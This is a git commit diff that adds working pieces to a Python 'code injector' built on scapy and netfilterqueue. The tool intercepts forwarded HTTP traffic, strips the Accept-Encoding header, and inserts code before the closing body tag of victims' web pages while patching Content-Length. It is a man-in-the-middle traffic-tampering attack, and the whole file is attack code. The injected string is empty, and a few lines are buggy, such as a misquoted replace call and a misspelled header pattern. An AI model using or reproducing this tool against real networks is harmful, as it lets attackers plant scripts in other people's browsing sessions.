65d645da8330e58d5fbe31e9abc9b2c5f34dba77
andrei-macovei <armacovei@gmail.com>
2023-08-03 11:00:11 -0400

    Code_injector basic functionality added

--- code_injector.py
+++ code_injector.py
@@ -3,6 +3,7 @@ import netfilterqueue
 import scapy.all as scapy
 import re
 
+
 # usable ONLY with HTTP connections
 # service apache2 start - START BUILT IN WEB SERVER
 # iptables -I FORWARD -j NFQUEUE --queue-num 0
@@ -26,18 +27,35 @@ def set_load(packet, load):
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
+        load = scapy_packet[scapy.Raw].load
         if scapy_packet[scapy.TCP].dport == 80:
             # print("HTTP Request")
             print("[+] Request")
             # remove encoding from the request, so that server sends unencoded HTML
-            modified_load = re.sub("Accept encoding:.*?\\r\\n", "", scapy_packet[scapy.Raw].load)
-            new_packet = set_load(scapy_packet, modified_load)
+            load = re.sub("Accept encoding:.*?\\r\\n", "", load)
+            new_packet = set_load(scapy_packet, load)
 
             # set payload to the initial packet
             packet.set_payload(str(new_packet))
         elif scapy_packet[scapy.TCP].sport == 80:
             # print("HTTP Response")
             print("[+] Request")
+            # code to be injected in the webpage
+            injection_code = ""
+            # injection taking place
+            load = load.replace("</body>, injection_code" + "</body>")
+
+            # modifying Content-Length attribute to include injected code
+            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
+            if content_length_search and "text/html" in load:
+                content_length = content_length_search.group(1)
+                new_content_length = int(content_length) + len(injection_code)
+                load = load.replace(content_length, str(new_content_length))
+
+        # modify packet
+        if load != scapy_packet[scapy.Raw].load:
+            new_packet = set_load(scapy_packet, load)
+            packet.set_payload(str(new_packet))
 
     packet.accept()
 
